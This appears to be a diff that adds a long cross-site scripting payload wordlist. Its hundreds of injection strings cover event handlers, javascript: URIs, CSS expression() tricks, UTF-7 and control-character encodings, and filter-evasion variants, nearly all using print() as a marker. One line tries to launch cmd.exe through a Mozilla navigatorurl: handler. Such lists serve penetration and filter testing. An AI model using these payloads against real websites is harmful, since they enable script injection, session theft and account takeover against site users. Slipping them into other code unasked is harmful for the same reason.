+<math><brute href=javascript:print()>click
+<form action=javascript:print()><input type=submit>
+<isindex action=javascript:print() type=submit value=click>
+<form><button formaction=javascript:print()>click
+<form><input formaction=javascript:print() type=submit value=click>
+<form><input formaction=javascript:print() type=image value=click>
+<form><input formaction=javascript:print() type=image src=SOURCE>
+<isindex formaction=javascript:print() type=submit value=click>
+<object data=javascript:print()>
+<svg><script xlink:href=data:,print() />
+<math><brute xlink:href=javascript:print()>click
+<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:print() to=&>
+<html ontouchstart=print()>
+<html ontouchend=print()>
+<html ontouchmove=print()>
+<html ontouchcancel=print()>
+<body onorientationchange=print()>
+"><img src=1 onerror=print()>.gif
+<svg xmlns="http://www.w3.org/2000/svg" onload="print()"/>
+GIF89a/*<svg/onload=print()>*/=print()//;
+<script src="data:&comma;print()//
+"><script src=data:&comma;print()//
+<link rel=import href="data:text/html&comma;&lt;script&gt;print()&lt;&sol;script&gt;
+"><link rel=import href=data:text/html&comma;&lt;script&gt;print()&lt;&sol;script&gt;
+<script/src="data:&comma;eval(atob(location.hash.slice(1)))//#print()
+<body onfocus=print()>
+<body onhashchange=print()><a href=#x>click this!#x
+<body style=overflow:auto;height:1000px onscroll=print() id=x>#x
+<body onscroll=print()><br><br><br><br>
+<body onresize=print()>press F12!
+<body onhelp=print()>press F1! (MSIE)
+<marquee onstart=print()>
+<marquee loop=1 width=0 onfinish=print()>
+<audio src onloadstart=print()>
+<video onloadstart=print()><source>
+<input autofocus onblur=print()>
+<keygen autofocus onfocus=print()>
+<select onchange=print()><option>1<option>2
+<menu id=x contextmenu=x onshow=print()>right click me!
+<Img Src=javascript:print() OnError=location=src>alert`1`
+eval(URL.slice(-8))>#print()
+eval(location.hash.slice(1)>#print()
+innerHTML=location.hash>#<script>print()</script>"'`ʼˈ‘’‚‛“”„‟′″‴‵‶‷﹅﹐＂＇，舧艠︐︑--><script>print()</script>
+"'><script>print()</script>
+"'><sCriPt>print()</sCriPt>
+"'><script >print()</script >
+"'><script foo=bar>print()</script>
+"'><\script>print()</script>
+"'><sc\ript>print()</script>
+"'><sc\tript>print()</script>
+"'><script onlyOpera:-)>print()
+"'><script /*%00*/>/*%00*/print()/*%00*/</script /*%00*/
+"'><///script///>print()</script>
+"'><///style///>print()</script>
+"'><isindex action="javas&Tab;cript:print()" type=image>
+"'><sc	ript>print()</script>
+"'ܾܼscriptܾprint()ܼܯscriptܾ
+jAvasCript:print()
+jAvas\Cript:print()
+jAvas	Cript:print()
+jAvas/* */Cript:print()
+<img src="/" =_=" title="onerror='print()'">
+<img src ?notinChrome?\/onerror = print()
+<img src ?notinChrome?\/onerror=print()
+<img/alt="/"src="/"onerror=print()>
+<iframe/src \/\/onload = print()
+<iframe/onreadystatechange=print()
+<div style="{ left:expression( print() ) }">
+left:expr/**/ession(print())
+left:expr/* */ession(print())
+left:e\0078pr\0065ssion(print())
+left:\0065\0078pr\0065ssion(print())
+left:expr\65ssion(print() ))
+left:expr\0065ssion(print())
+left:expr&#x65;ssion(print())
+left:expr&#101;ssion(print())
+left:expr&#x0065;ssion(print())
+left:\ff45\ff58\ff50\ff52\ff45\ff53\ff53\ff49\ff4f\ff4e(print())
+left:&#xff45;&#xff58;&#xff50;&#xff52;&#xff45;&#xff53;&#xff53;&#xff49;&#xff4f;&#xff4e;(print())
+left:ｅｘｐｒｅｓｓｉｏｎ(print())
+left:EXPR/**/ESSION(print())
+left:EXPR/* */ESSION(print())
+left:\ff25\ff38\ff30\ff32\ff42\ff53\ff33\ff29\ff2f\ff2e(print())
+left:&#xff25;&#xff38;&#xff30;&#xff32;&#xff42;&#xff53;&#xff33;&#xff29;&#xff2f;&#xff2e;(print())
+left:ＥＸＰＲＥＳＳＩＯＮ(print())
+left:exp\0280essio\0274(print())
+left:exp\0280essio\207f(print())
+left:expʀessioɴ(print())
+left:expʀessioⁿ(print())
+href="data:text/html;charset=utf-7,+ADw-script+AD4-print()+ADsAPA-/script+AD4-"	UTF-7
+href="data:text/html;charset=utf-7,+ADwAcwBjAHIAaQBwAHQAPg-print()+ADsAPA-/script+AD4-"	UTF-7/UTF-8 mix
+%22onmouseover%3d'print()'%3d%22%3e
+%20%22onmouseover%3d'print()'%3d%22%3e
+<%<!--'%><script>print();</script -->onclick=eval/**/(/ale/.source%2b/rt/.source%2b/(7)/.source);
+';print()//\';print()//";print()//\";print()//--></SCRIPT>">'><SCRIPT>print()</SCRIPT>=&{}");}print();function xss(){//
+';print()//\';print()//";print()//\";print()//--></SCRIPT>">'></title><SCRIPT>print()</SCRIPT>=&{</title><script>print()</script>}");}
+<BASE HREF="javascript:print();//">
+`> <script>print()</script>
+> <script>print()</script>
+xyz onerror=print();
+'> <script>print()</script>
+</title><script>print()</script>
+<BGSOUND SRC="javascript:print();">
+<BODY BACKGROUND="javascript:print();">
+<BODY ONLOAD=print()>
+<IMG SRC=JaVaScRiPt:print()>
+<script>var a = "</script> <script> print(); </script> <script>";</script>
+<!--[if gte IE 4]><SCRIPT>print();</SCRIPT><![endif]-->
+width: expression((window.r==document.cookie)?'':print())
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>print()</SCRIPT>">
+<DIV STYLE="background-image: url(javascript:print())">
+<DIV STYLE="background-image: url(&#1;javascript:print())">
+<DIV STYLE="width: expression(print());">
+<IMG SRC="jav&#x0D;ascript:print();">
+<IMG SRC="jav&#x09;ascript:print();">
+<IMG SRC="jav&#x0A;ascript:print();">
+<IMG SRC="javascript:print();">
+</TITLE><SCRIPT>print();</SCRIPT>
+\";print();//
+<<SCRIPT>print();//<</SCRIPT>
+firefoxurl:test|"%20-new-window%20javascript:print();"
+<FRAMESET><FRAME SRC="javascript:print();"></FRAMESET>
+<IMG SRC=`javascript:print()`>
+<IMG SRC="javascript:print()"
+<IMG SRC=javascript:print()>
+'';!--"<script>print();</script>=&{(print())}
+<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>print();</html:script></html:html>
+<img src=`x` onrerror= ` ;; print() ` />
+style=color: expression(print());" a="
+<IFRAME SRC="javascript:print();"></IFRAME>
+<IMG DYNSRC="javascript:print();">
+<IMG LOWSRC="javascript:print();">
+exp/*<XSS STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(print())'>
+<INPUT TYPE="IMAGE" SRC="javascript:print();">
+<BR SIZE="&{print()}">
++print()+
+<STYLE>li {list-style-image: url("javascript:print()");}</STYLE><UL><LI>XSS
+<IMG """><SCRIPT>print()</SCRIPT>">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:print();">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:print();">
+<IMGSRC="javascript:print()">
+navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);print()
+<SCRIPT>a=/XSS/print()</SCRIPT>
+<BODY onload!#$%&()*~+-_.###:;?@[/|\]^`=print()>
+perl -e 'print "<IMG SRC=java\0script:print()>";'> out
+perl -e 'print "&<SCR\0IPT>print()</SCR\0IPT>";' > out
+print()>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:print()></OBJECT>
+a="get";&#10;b="URL("";&#10;c="javascript:";&#10;d="print();")";eval(a+b+c+d);
+<? echo('<SCR)';echo('IPT>print()</SCRIPT>'); ?>
+<SCRIPT>print()</SCRIPT>
+<IMG SRC=" &#14;  javascript:print();">
+<STYLE TYPE="text/javascript">print();</STYLE>
+<XSS STYLE="xss:expression(print())">
+<STYLE type="text/css">BODY{background:url("javascript:print()")}</STYLE>
+<STYLE>.XSS{background-image:url("javascript:print()");}</STYLE><A CLASS=XSS></A>
+<STYLE>@im\port'\ja\vasc\ript:print()';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(print())">
+<LINK REL="stylesheet" HREF="javascript:print();">
+<TABLE BACKGROUND="javascript:print()"></TABLE>
+<TABLE><TD BACKGROUND="javascript:print()"></TD></TABLE>
+http://aa"><script>print()</script>
+http://aa'><script>print()</script>
+>%22%27><img%20src%3d%22javascript:print()%22>';print()//\';print()//";print()//\";print()//--></SCRIPT>">'><SCRIPT>print()</SCRIPT>=&{}");}print();function xss(){//
+"><script>print();</script>
+'><script>print();</script>
+'<script>print();</script>
+<img src=x onerror=;;print() />
+;}print();{
+"+print()+"
+" style="color: expression(print());" a="
+c%00""<script>print();</script>
+http://aa<script>print()</script>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:print();">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:print()"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>print()</SCRIPT>"> </BODY></HTML>
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-print();+ADw-/SCRIPT+AD4-
+<IMG SRC="jav	ascript:print();">
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=print()>
+<A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>script\x20type="text/javascript">javascript:print();</script>
+<script\x3Etype="text/javascript">javascript:print();</script>
+<script\x0Dtype="text/javascript">javascript:print();</script>
+<script\x09type="text/javascript">javascript:print();</script>
+<script\x0Ctype="text/javascript">javascript:print();</script>
+</script><script>print();</script>
+<script\x2Ftype="text/javascript">javascript:print();</script>
+<script\x0Atype="text/javascript">javascript:print();</script>
+'`"><\x3Cscript>javascript:print()</script>
+'`"><\x00script>javascript:print()</script>
+<img src=1 href=1 onerror="javascript:print()"></img>
+<audio src=1 href=1 onerror="javascript:print()"></audio>
+<video src=1 href=1 onerror="javascript:print()"></video>
+<body src=1 href=1 onerror="javascript:print()"></body>
+<image src=1 href=1 onerror="javascript:print()"></image>
+<object src=1 href=1 onerror="javascript:print()"></object>
+<script src=1 href=1 onerror="javascript:print()"></script>
+<svg onResize svg onResize="javascript:javascript:print()"></svg onResize>
+<title onPropertyChange title onPropertyChange="javascript:javascript:print()"></title onPropertyChange>
+<iframe onLoad iframe onLoad="javascript:javascript:print()"></iframe onLoad>
+<body onMouseEnter body onMouseEnter="javascript:javascript:print()"></body onMouseEnter>
+<body onFocus body onFocus="javascript:javascript:print()"></body onFocus>
+<frameset onScroll frameset onScroll="javascript:javascript:print()"></frameset onScroll>
+<script onReadyStateChange script onReadyStateChange="javascript:javascript:print()"></script onReadyStateChange>
+<html onMouseUp html onMouseUp="javascript:javascript:print()"></html onMouseUp>
+<body onPropertyChange body onPropertyChange="javascript:javascript:print()"></body onPropertyChange>
+<svg onLoad svg onLoad="javascript:javascript:print()"></svg onLoad>
+<body onPageHide body onPageHide="javascript:javascript:print()"></body onPageHide>
+<body onMouseOver body onMouseOver="javascript:javascript:print()"></body onMouseOver>
+<body onUnload body onUnload="javascript:javascript:print()"></body onUnload>
+<body onLoad body onLoad="javascript:javascript:print()"></body onLoad>
+<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:print()"></bgsound onPropertyChange>
+<html onMouseLeave html onMouseLeave="javascript:javascript:print()"></html onMouseLeave>
+<html onMouseWheel html onMouseWheel="javascript:javascript:print()"></html onMouseWheel>
+<style onLoad style onLoad="javascript:javascript:print()"></style onLoad>
+<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:print()"></iframe onReadyStateChange>
+<body onPageShow body onPageShow="javascript:javascript:print()"></body onPageShow>
+<style onReadyStateChange style onReadyStateChange="javascript:javascript:print()"></style onReadyStateChange>
+<frameset onFocus frameset onFocus="javascript:javascript:print()"></frameset onFocus>
+<applet onError applet onError="javascript:javascript:print()"></applet onError>
+<marquee onStart marquee onStart="javascript:javascript:print()"></marquee onStart>
+<script onLoad script onLoad="javascript:javascript:print()"></script onLoad>
+<html onMouseOver html onMouseOver="javascript:javascript:print()"></html onMouseOver>
+<html onMouseEnter html onMouseEnter="javascript:parent.javascript:print()"></html onMouseEnter>
+<body onBeforeUnload body onBeforeUnload="javascript:javascript:print()"></body onBeforeUnload>
+<html onMouseDown html onMouseDown="javascript:javascript:print()"></html onMouseDown>
+<marquee onScroll marquee onScroll="javascript:javascript:print()"></marquee onScroll>
+<xml onPropertyChange xml onPropertyChange="javascript:javascript:print()"></xml onPropertyChange>
+<frameset onBlur frameset onBlur="javascript:javascript:print()"></frameset onBlur>
+<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:print()"></applet onReadyStateChange>
+<svg onUnload svg onUnload="javascript:javascript:print()"></svg onUnload>
+<html onMouseOut html onMouseOut="javascript:javascript:print()"></html onMouseOut>
+<body onMouseMove body onMouseMove="javascript:javascript:print()"></body onMouseMove>
+<body onResize body onResize="javascript:javascript:print()"></body onResize>
+<object onError object onError="javascript:javascript:print()"></object onError>
+<body onPopState body onPopState="javascript:javascript:print()"></body onPopState>
+<html onMouseMove html onMouseMove="javascript:javascript:print()"></html onMouseMove>
+<applet onreadystatechange applet onreadystatechange="javascript:javascript:print()"></applet onreadystatechange>
+<body onpagehide body onpagehide="javascript:javascript:print()"></body onpagehide>
+<svg onunload svg onunload="javascript:javascript:print()"></svg onunload>
+<applet onerror applet onerror="javascript:javascript:print()"></applet onerror>
+<body onkeyup body onkeyup="javascript:javascript:print()"></body onkeyup>
+<body onunload body onunload="javascript:javascript:print()"></body onunload>
+<iframe onload iframe onload="javascript:javascript:print()"></iframe onload>
+<body onload body onload="javascript:javascript:print()"></body onload>
+<html onmouseover html onmouseover="javascript:javascript:print()"></html onmouseover>
+<object onbeforeload object onbeforeload="javascript:javascript:print()"></object onbeforeload>
+<body onbeforeunload body onbeforeunload="javascript:javascript:print()"></body onbeforeunload>
+<body onfocus body onfocus="javascript:javascript:print()"></body onfocus>
+<body onkeydown body onkeydown="javascript:javascript:print()"></body onkeydown>
+<iframe onbeforeload iframe onbeforeload="javascript:javascript:print()"></iframe onbeforeload>
+<iframe src iframe src="javascript:javascript:print()"></iframe src>
+<svg onload svg onload="javascript:javascript:print()"></svg onload>
+<html onmousemove html onmousemove="javascript:javascript:print()"></html onmousemove>
+<body onblur body onblur="javascript:javascript:print()"></body onblur>
+\x3Cscript>javascript:print()</script>
+'"`><script>/* *\x2Fjavascript:print()// */</script>
+<script>javascript:print()</script\x0D
+<script>javascript:print()</script\x0A
+<script>javascript:print()</script\x0B
+<script charset="\x22>javascript:print()</script>
+<!--\x3E<img src=xxx:x onerror=javascript:print()> -->
+--><!-- ---> <img src=xxx:x onerror=javascript:print()> -->
+--><!-- --\x00> <img src=xxx:x onerror=javascript:print()> -->
+--><!-- --\x21> <img src=xxx:x onerror=javascript:print()> -->
+--><!-- --\x3E> <img src=xxx:x onerror=javascript:print()> -->
+`"'><img src='#\x27 onerror=javascript:print()>
+<a href="javascript\x3Ajavascript:print()" id="fuzzelement1">test</a>
+"'`><p><svg><script>a='hello\x27;javascript:print()//';</script></p>
+<a href="javas\x00cript:javascript:print()" id="fuzzelement1">test</a>
+<a href="javas\x07cript:javascript:print()" id="fuzzelement1">test</a>
+<a href="javas\x0Dcript:javascript:print()" id="fuzzelement1">test</a>
+<a href="javas\x0Acript:javascript:print()" id="fuzzelement1">test</a>
+<a href="javas\x08cript:javascript:print()" id="fuzzelement1">test</a>
+<a href="javas\x02cript:javascript:print()" id="fuzzelement1">test</a>
+<a href="javas\x03cript:javascript:print()" id="fuzzelement1">test</a>
+<a href="javas\x04cript:javascript:print()" id="fuzzelement1">test</a>
+<a href="javas\x01cript:javascript:print()" id="fuzzelement1">test</a>
+<a href="javas\x05cript:javascript:print()" id="fuzzelement1">test</a>
+<a href="javas\x0Bcript:javascript:print()" id="fuzzelement1">test</a>
+<a href="javas\x09cript:javascript:print()" id="fuzzelement1">test</a>
+<a href="javas\x06cript:javascript:print()" id="fuzzelement1">test</a>
+<a href="javas\x0Ccript:javascript:print()" id="fuzzelement1">test</a>
+<script>/* *\x2A/javascript:print()// */</script>
+<script>/* *\x00/javascript:print()// */</script>
+<style></style\x3E<img src="about:blank" onerror=javascript:print()//></style>
+<style></style\x0D<img src="about:blank" onerror=javascript:print()//></style>
+<style></style\x09<img src="about:blank" onerror=javascript:print()//></style>
+<style></style\x20<img src="about:blank" onerror=javascript:print()//></style>
+<style></style\x0A<img src="about:blank" onerror=javascript:print()//></style>
+"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:print();/*';">DEF
+"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:print();/*';">DEF
+<script>if("x\\xE1\x96\x89".length==2) { javascript:print();}</script>
+<script>if("x\\xE0\xB9\x92".length==2) { javascript:print();}</script>
+<script>if("x\\xEE\xA9\x93".length==2) { javascript:print();}</script>
+"'`><\x3Cimg src=xxx:x onerror=javascript:print()>
+"'`><\x00img src=xxx:x onerror=javascript:print()>
+<script src="data:text/plain\x2Cjavascript:print()"></script>
+<script src="data:\xD4\x8F,javascript:print()"></script>
+<script src="data:\xE0\xA4\x98,javascript:print()"></script>
+<script src="data:\xCB\x8F,javascript:print()"></script>
+<script\x20type="text/javascript">javascript:print();</script>
+ABC<div style="x\x3Aexpression(javascript:print()">DEF
+ABC<div style="x:expression\x5C(javascript:print()">DEF
+ABC<div style="x:expression\x00(javascript:print()">DEF
+ABC<div style="x:exp\x00ression(javascript:print()">DEF
+ABC<div style="x:exp\x5Cression(javascript:print()">DEF
+ABC<div style="x:\x0Aexpression(javascript:print()">DEF
+ABC<div style="x:\x09expression(javascript:print()">DEF
+ABC<div style="x:\xE3\x80\x80expression(javascript:print()">DEF
+ABC<div style="x:\xE2\x80\x84expression(javascript:print()">DEF
+ABC<div style="x:\xC2\xA0expression(javascript:print()">DEF
+ABC<div style="x:\xE2\x80\x80expression(javascript:print()">DEF
+ABC<div style="x:\xE2\x80\x8Aexpression(javascript:print()">DEF
+ABC<div style="x:\x0Dexpression(javascript:print()">DEF
+ABC<div style="x:\x0Cexpression(javascript:print()">DEF
+ABC<div style="x:\xE2\x80\x87expression(javascript:print()">DEF
+ABC<div style="x:\xEF\xBB\xBFexpression(javascript:print()">DEF
+ABC<div style="x:\x20expression(javascript:print()">DEF
+ABC<div style="x:\xE2\x80\x88expression(javascript:print()">DEF
+ABC<div style="x:\x00expression(javascript:print()">DEF
+ABC<div style="x:\xE2\x80\x8Bexpression(javascript:print()">DEF
+ABC<div style="x:\xE2\x80\x86expression(javascript:print()">DEF
+ABC<div style="x:\xE2\x80\x85expression(javascript:print()">DEF
+ABC<div style="x:\xE2\x80\x82expression(javascript:print()">DEF
+ABC<div style="x:\x0Bexpression(javascript:print()">DEF
+ABC<div style="x:\xE2\x80\x81expression(javascript:print()">DEF
+ABC<div style="x:\xE2\x80\x83expression(javascript:print()">DEF
+ABC<div style="x:\xE2\x80\x89expression(javascript:print()">DEF
+<a href="\x0Bjavascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x0Fjavascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\xC2\xA0javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x05javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\xE1\xA0\x8Ejavascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x18javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x11javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x88javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x89javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x80javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x17javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x03javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x0Ejavascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x1Ajavascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x00javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x10javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x82javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x20javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x13javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x09javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x8Ajavascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x14javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x19javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xAFjavascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x1Fjavascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x81javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x1Djavascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x87javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x07javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\xE1\x9A\x80javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x83javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x04javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x01javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x08javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x84javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x86javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\xE3\x80\x80javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x12javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x0Djavascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x0Ajavascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x0Cjavascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x15javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xA8javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x16javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x02javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x1Bjavascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x06javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xA9javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x85javascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x1Ejavascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\xE2\x81\x9Fjavascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="\x1Cjavascript:javascript:print()" id="fuzzelement1">test</a>
+<a href="javascript\x00:javascript:print()" id="fuzzelement1">test</a>
+<a href="javascript\x3A:javascript:print()" id="fuzzelement1">test</a>
+<a href="javascript\x09:javascript:print()" id="fuzzelement1">test</a>
+<a href="javascript\x0D:javascript:print()" id="fuzzelement1">test</a>
+<a href="javascript\x0A:javascript:print()" id="fuzzelement1">test</a>
+`"'><img src=xxx:x \x0Aonerror=javascript:print()>
+`"'><img src=xxx:x \x22onerror=javascript:print()>
+`"'><img src=xxx:x \x0Bonerror=javascript:print()>
+`"'><img src=xxx:x \x0Donerror=javascript:print()>
+`"'><img src=xxx:x \x2Fonerror=javascript:print()>
+`"'><img src=xxx:x \x09onerror=javascript:print()>
+`"'><img src=xxx:x \x0Conerror=javascript:print()>
+`"'><img src=xxx:x \x00onerror=javascript:print()>
+`"'><img src=xxx:x \x27onerror=javascript:print()>
+`"'><img src=xxx:x \x20onerror=javascript:print()>
+"`'><script>\x3Bjavascript:print()</script>
+"`'><script>\x0Djavascript:print()</script>
+"`'><script>\xEF\xBB\xBFjavascript:print()</script>
+"`'><script>\xE2\x80\x81javascript:print()</script>
+"`'><script>\xE2\x80\x84javascript:print()</script>
+"`'><script>\xE3\x80\x80javascript:print()</script>
+"`'><script>\x09javascript:print()</script>
+"`'><script>\xE2\x80\x89javascript:print()</script>
+"`'><script>\xE2\x80\x85javascript:print()</script>
+"`'><script>\xE2\x80\x88javascript:print()</script>
+"`'><script>\x00javascript:print()</script>
+"`'><script>\xE2\x80\xA8javascript:print()</script>
+"`'><script>\xE2\x80\x8Ajavascript:print()</script>
+"`'><script>\xE1\x9A\x80javascript:print()</script>
+"`'><script>\x0Cjavascript:print()</script>
+"`'><script>\x2Bjavascript:print()</script>
+"`'><script>\xF0\x90\x96\x9Ajavascript:print()</script>
+"`'><script>-javascript:print()</script>
+"`'><script>\x0Ajavascript:print()</script>
+"`'><script>\xE2\x80\xAFjavascript:print()</script>
+"`'><script>\x7Ejavascript:print()</script>
+"`'><script>\xE2\x80\x87javascript:print()</script>
+"`'><script>\xE2\x81\x9Fjavascript:print()</script>
+"`'><script>\xE2\x80\xA9javascript:print()</script>
+"`'><script>\xC2\x85javascript:print()</script>
+"`'><script>\xEF\xBF\xAEjavascript:print()</script>
+"`'><script>\xE2\x80\x83javascript:print()</script>
+"`'><script>\xE2\x80\x8Bjavascript:print()</script>
+"`'><script>\xEF\xBF\xBEjavascript:print()</script>
+"`'><script>\xE2\x80\x80javascript:print()</script>
+"`'><script>\x21javascript:print()</script>
+"`'><script>\xE2\x80\x82javascript:print()</script>
+"`'><script>\xE2\x80\x86javascript:print()</script>
+"`'><script>\xE1\xA0\x8Ejavascript:print()</script>
+"`'><script>\x0Bjavascript:print()</script>
+"`'><script>\x20javascript:print()</script>
+"`'><script>\xC2\xA0javascript:print()</script>
+"/><img/onerror=\x0Bjavascript:print()\x0Bsrc=xxx:x />
+"/><img/onerror=\x22javascript:print()\x22src=xxx:x />
+"/><img/onerror=\x09javascript:print()\x09src=xxx:x />
+"/><img/onerror=\x27javascript:print()\x27src=xxx:x />
+"/><img/onerror=\x0Ajavascript:print()\x0Asrc=xxx:x />
+"/><img/onerror=\x0Cjavascript:print()\x0Csrc=xxx:x />
+"/><img/onerror=\x0Djavascript:print()\x0Dsrc=xxx:x />
+"/><img/onerror=\x60javascript:print()\x60src=xxx:x />
+"/><img/onerror=\x20javascript:print()\x20src=xxx:x />
+<script\x2F>javascript:print()</script>
+<script\x20>javascript:print()</script>
+<script\x0D>javascript:print()</script>
+<script\x0A>javascript:print()</script>
+<script\x0C>javascript:print()</script>
+<script\x00>javascript:print()</script>
+<script\x09>javascript:print()</script>
+`"'><img src=xxx:x onerror\x0B=javascript:print()>
+`"'><img src=xxx:x onerror\x00=javascript:print()>
+`"'><img src=xxx:x onerror\x0C=javascript:print()>
+`"'><img src=xxx:x onerror\x0D=javascript:print()>
+`"'><img src=xxx:x onerror\x20=javascript:print()>
+`"'><img src=xxx:x onerror\x0A=javascript:print()>
+`"'><img src=xxx:x onerror\x09=javascript:print()>
+<script>javascript:print()<\x00/script>
+<img src=# onerror\x3D"javascript:print()" >
+<input onfocus=javascript:print() autofocus>
+<input onblur=javascript:print() autofocus><input autofocus>
+<video poster=javascript:javascript:print()//
+<body onscroll=javascript:print()><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<form id=test onforminput=javascript:print()><input></form><button form=test onformchange=javascript:print()>X
+<video><source onerror="javascript:javascript:print()">
+<video onerror="javascript:javascript:print()"><source>
+<form><button formaction="javascript:javascript:print()">X
+<body oninput=javascript:print()><input autofocus>
+<math href="javascript:javascript:print()">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:print()">CLICKME</maction> </math>
+<frameset onload=javascript:print()>
+<table background="javascript:javascript:print()">
+<!--<img src="--><img src=x onerror=javascript:print()//">
+<comment><img src="</comment><img src=x onerror=javascript:print())//">
+<![><img src="]><img src=x onerror=javascript:print()//">
+<style><img src="</style><img src=x onerror=javascript:print()//">
+<li style=list-style:url() onerror=javascript:print()> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:print()></div>
+<head><base href="javascript://"></head><body><a href="/. /,javascript:print()//#">XXX</a></body>
+<SCRIPT FOR=document EVENT=onreadystatechange>javascript:print()</SCRIPT>
+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:print()"></OBJECT>
+<b <script>print()</script>0
+<div id="div1"><input value="``onmouseover=javascript:print()"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
+<x '="foo"><x foo='><img src=x onerror=javascript:print()//'>
+<image src="javascript:print()">
+<script src="javascript:print()">
+<div style=width:1px;filter:glow onfilterchange=javascript:print()>x
